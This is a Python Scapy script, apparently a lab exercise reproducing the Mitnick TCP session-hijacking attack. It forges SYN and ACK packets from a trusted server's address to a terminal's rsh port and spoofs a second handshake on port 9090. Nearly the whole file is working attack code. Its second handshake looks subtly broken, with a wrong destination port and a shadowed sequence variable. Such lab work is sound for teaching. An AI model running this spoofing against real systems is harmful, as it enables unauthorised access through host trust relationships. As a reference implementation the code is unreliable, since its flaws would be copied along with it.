#!/usr/bin/python3
from scapy.all import *

# Define IPs and ports for the connection
x_ip = "10.9.0.5"     # X-Terminal IP
x_port = 514          # rsh service port on X-Terminal
srv_ip = "10.9.0.6"   # Trusted Server IP
srv_port = 1023       # Source port for the SYN packet

# Global variable to store sequence number from SYN+ACK packet
seq_num = None  # Initialize globally

# Task 2.1: Establish the First TCP Connection
# Step 1: Send a spoofed SYN packet to start the TCP handshake
syn_pkt = IP(src=srv_ip, dst=x_ip) / TCP(sport=srv_port, dport=x_port, flags="S", seq=0)
send(syn_pkt)
print("Spoofed SYN packet sent from Trusted Server to X-Terminal with sequence number 0.")

# Step 2: Define function to spoof an ACK packet in response to a SYN+ACK
def spoof_ack(pkt):
    global seq_num  # Use global seq_num to store the sequence number
    if pkt[TCP].flags == "SA":  # Check if packet is SYN+ACK
        seq_num = pkt[TCP].seq + 1  # Capture and increment the sequence number
        ack_pkt = IP(src=srv_ip, dst=x_ip) / TCP(sport=srv_port, dport=x_port, flags="A", seq=0, ack=seq_num)
        send(ack_pkt)
        print("Spoofed ACK sent to complete the handshake with sequence number 0.")

# Sniff for SYN+ACK from X-Terminal and call spoof_ack when detected
sniff(filter=f"tcp and src host {x_ip} and dst port {srv_port}", prn=spoof_ack, count=1)


# Task 2.2: Establish the Second TCP Connection
# Step 1: Sniff for SYN from X-Terminal to Trusted Server and respond with SYN+ACK
def spoof_second_syn_ack(pkt):
    if pkt[TCP].flags == "S":  # Check if packet is SYN packet
        # Capture the sequence number and prepare to respond
        seq_num = pkt[TCP].seq + 1
        syn_ack_pkt = IP(src=srv_ip, dst=x_ip) / TCP(sport=9090, dport=x_port, flags="SA", seq=0, ack=seq_num)
        send(syn_ack_pkt)
        print("Spoofed SYN+ACK sent for the second connection.")

# Step 2: Sniff for ACK from X-Terminal to complete the second handshake
def complete_second_handshake(pkt):
    if pkt[TCP].flags == "A":  # Check if packet is an ACK packet
        print("Second TCP handshake completed successfully.")

# Sniff for the second connection’s SYN from X-Terminal and respond with SYN+ACK
sniff(filter=f"tcp and src host {x_ip} and dst port 9090", prn=spoof_second_syn_ack, count=1)

# Sniff for the ACK from X-Terminal to complete the handshake for the second connection
sniff(filter=f"tcp and src host {x_ip} and dst port 9090", prn=complete_second_handshake, count=1)
